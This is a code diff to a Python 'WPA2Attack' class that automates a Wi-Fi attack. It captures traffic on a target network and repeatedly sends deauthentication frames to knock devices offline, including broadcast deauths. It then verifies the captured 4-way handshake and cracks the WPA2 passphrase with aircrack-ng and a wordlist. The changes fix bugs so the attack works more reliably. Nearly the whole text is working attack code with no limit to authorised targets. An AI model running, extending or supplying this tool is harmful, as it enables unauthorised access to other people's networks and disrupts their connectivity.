@@ -34,11 +34,21 @@ class WPA2Attack:
         # Set channel
         self._set_channel(channel)
 
-        # Start capture
-        capfile_base = os.path.join(
-            self.output_dir,
-            f"wpa2_{essid.replace(' ', '_')}_{bssid.replace(':', '')}"
-        )
+        # Build capture base path and clean up any old caps for this target
+        # so airodump-ng always writes -01.cap (avoids filename collision bug)
+        safe_essid = essid.replace(' ', '_')
+        safe_bssid = bssid.replace(':', '')
+        capfile_base = os.path.join(self.output_dir, f"wpa2_{safe_essid}_{safe_bssid}")
+
+        # BUG 5 FIX: old caps are owned by root — wrap removal in try/except
+        for old in [f"{capfile_base}-{i:02d}.cap" for i in range(1, 10)]:
+            if os.path.exists(old):
+                try:
+                    os.remove(old)
+                except PermissionError:
+                    # File owned by root from a previous sudo run; try via subprocess
+                    subprocess.run(["rm", "-f", old], capture_output=True)
+
         self._capfile = capfile_base + "-01.cap"
 
         log.info(f"Starting capture on CH {channel} for {essid}")
@@ -59,25 +69,28 @@ class WPA2Attack:
         )
 
         # Wait a moment then deauth
-        time.sleep(3)
+        time.sleep(2)
 
         handshake_found = False
         start = time.time()
+        client_info = f" | {len(clients)} client(s)" if clients else " | no clients seen (deauthing broadcast)"
 
         while time.time() - start < self.timeout:
             elapsed = int(time.time() - start)
 
-            # Send deauth every 10s
-            if elapsed % 10 == 0 or elapsed < 5:
+            # Send deauth every 5s
+            if elapsed % 5 == 0:
                 self._deauth(bssid, clients)
 
-            # Check for handshake
-            if os.path.exists(self._capfile):
-                if self._check_handshake(self._capfile, bssid):
+            # Find whatever cap file airodump-ng actually wrote
+            actual_cap = self._find_capfile(capfile_base)
+            if actual_cap and elapsed % 2 == 0:
+                if self._check_handshake(actual_cap, bssid):
+                    self._capfile = actual_cap
                     handshake_found = True
                     break
 
-            print(f"\r[*] Waiting for handshake... {elapsed}s / {self.timeout}s", end="", flush=True)
+            print(f"\r[*] Waiting for handshake... {elapsed}s / {self.timeout}s{client_info}", end="", flush=True)
             time.sleep(1)
 
         print()
@@ -89,7 +102,16 @@ class WPA2Attack:
             return {"captured": True, "capfile": self._capfile}
         else:
             log.warn("No handshake captured within timeout")
+            log.warn("Tip: Make sure a device is actively connected to the target network.")
             return {"captured": False}
+
+    def _find_capfile(self, capfile_base):
+        """Find the actual .cap file written by airodump-ng (handles -01, -02, etc.)"""
+        for i in range(1, 20):
+            path = f"{capfile_base}-{i:02d}.cap"
+            if os.path.exists(path) and os.path.getsize(path) > 0:
+                return path
+        return None
 
     def _set_channel(self, channel):
         """Lock interface to target channel"""
@@ -139,17 +161,32 @@ class WPA2Attack:
             )
 
     def _check_handshake(self, capfile, bssid):
-        """Verify handshake in capture file"""
-        # Method 1: aircrack-ng check
+        """
+        Verify a usable WPA2 handshake exists in the capture file.
+
+        BUG 1 FIX: The old check used `"handshake" in stdout.lower()` which
+        matched the string "0 handshake" — always returning True even with no
+        handshake.  We now run aircrack-ng WITHOUT -b so it prints the full
+        table including the handshake count per BSSID, then look for the
+        exact string "WPA (1 handshake)" which only appears when ≥1 complete
+        4-way exchange was captured.
+        """
+        # Method 1: aircrack-ng — run WITHOUT -b to get the BSSID table
+        # which prints "WPA (0 handshake)" or "WPA (1 handshake)" per AP.
         if check_tool("aircrack-ng"):
             result = subprocess.run(
                 ["aircrack-ng", capfile],
                 capture_output=True, text=True, timeout=10
             )
-            if "1 handshake" in result.stdout or "handshake" in result.stdout.lower():
+            # Only match the exact count — "1 handshake" never appears in
+            # the "0 handshake" output, so no false positives.
+            if "1 handshake" in result.stdout:
                 return True
+            # If aircrack-ng explicitly says 0, no need to check tshark.
+            if "0 handshake" in result.stdout:
+                return False
 
-        # Method 2: tshark check
+        # Method 2: tshark — verify EAPOL from BOTH AP and client (fallback)
         if check_tool("tshark"):
             result = subprocess.run(
                 ["tshark", "-r", capfile,
@@ -158,14 +195,22 @@ class WPA2Attack:
                  "-e", "wlan.sa"],
                 capture_output=True, text=True, timeout=10
             )
-            eapol_frames = [l for l in result.stdout.splitlines() if l.strip()]
-            if len(eapol_frames) >= 2:
+            senders = set(
+                l.strip().lower()
+                for l in result.stdout.splitlines() if l.strip()
+            )
+            ap = bssid.lower()
+            clients = senders - {ap}
+            # Need EAPOL frames from AP *and* at least one distinct client
+            if ap in senders and clients:
                 return True
 
         return False
 
     def crack(self, capfile):
-        """Crack handshake with wordlist"""
+        """Crack handshake with wordlist — streams aircrack-ng output live"""
+        import re
+
         if not self.wordlist:
             return None
 
@@ -173,21 +218,87 @@ class WPA2Attack:
             log.error(f"Wordlist not found: {self.wordlist}")
             return None
 
-        log.info(f"Cracking with aircrack-ng + {self.wordlist}...")
+        # ── Pre-validate: confirm aircrack-ng sees a usable handshake ──────
+        #
+        # BUG 2 FIX: The previous pre-check used `-b BSSID` which makes
+        # aircrack-ng output "1 potential targets / Please specify a dictionary"
+        # regardless of whether a handshake exists — so "0 handshake" never
+        # appeared and the guard never fired.
+        #
+        # We now run WITHOUT -b so aircrack-ng prints the full BSSID table
+        # with explicit handshake counts: "WPA (0 handshake)" vs "WPA (1 handshake)".
+        pre = subprocess.run(
+            ["aircrack-ng", capfile],
+            capture_output=True, text=True, timeout=10
+        )
+        pre_out = pre.stdout + pre.stderr
+        if "0 handshake" in pre_out and "1 handshake" not in pre_out:
+            log.error("[!] No valid WPA handshake found in capture file.")
+            log.warn("    Handshake requires a connected client to be deauthed and reconnect.")
+            log.warn("    → Connect a device to the network, then capture again.")
+            return None
 
-        result = subprocess.run(
-            ["aircrack-ng", capfile,
-             "-w", self.wordlist,
-             "-b", self.target["bssid"]],
-            capture_output=True, text=True,
-            timeout=300
+        wl_lines = sum(1 for _ in open(self.wordlist, "rb"))
+        log.info(f"Cracking with aircrack-ng + {self.wordlist} ({wl_lines:,} passwords)...")
+        log.info("[*] This may take several minutes. Press Ctrl+C to stop early.")
+
+        cmd = [
+            "aircrack-ng", capfile,
+            "-w", self.wordlist,
+            "-b", self.target["bssid"],
+            "-q",   # suppress curses TUI — gives plain line output
+        ]
+
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
         )
 
-        for line in result.stdout.splitlines():
-            if "KEY FOUND" in line:
-                # Extract password from "KEY FOUND! [ password ]"
-                match = __import__("re").search(r'KEY FOUND! \[ (.+?) \]', line)
-                if match:
-                    return match.group(1)
+        found = None
+        try:
+            for raw in proc.stdout:
+                line = raw.rstrip()
+                if not line:
+                    continue
 
-        return None
+                if "KEY FOUND" in line:
+                    match = re.search(r'KEY FOUND! \[ (.+?) \]', line)
+                    if match:
+                        found = match.group(1)
+                    break
+
+                elif "Passphrase not in dictionary" in line or "Failed. Next" in line:
+                    print()
+                    log.warn("[!] Password not in wordlist — try a different wordlist.")
+                    break
+
+                elif "No valid WPA handshakes found" in line:
+                    print()
+                    log.error("[!] No valid WPA handshake — capture a fresh handshake first.")
+                    break
+
+                # BUG 3 FIX: aircrack-ng exits with this when cap has no EAPOL
+                elif "Packets contained no EAPOL data" in line:
+                    print()
+                    log.error("[!] Capture contains no EAPOL frames — handshake was not captured.")
+                    log.warn("    → Ensure a client is connected to the AP, then run again.")
+                    break
+
+                elif re.search(r'\d+/\d+|keys tested|\d+\.\d+\s*k/s', line, re.I):
+                    print(f"\r   {line.strip():<70}", end="", flush=True)
+
+        except KeyboardInterrupt:
+            proc.terminate()
+            print()
+            log.warn("[!] Cracking stopped by user.")
+        finally:
+            try:
+                proc.wait(timeout=5)
+            except Exception:
+                proc.kill()
+            print()
+
+        return found
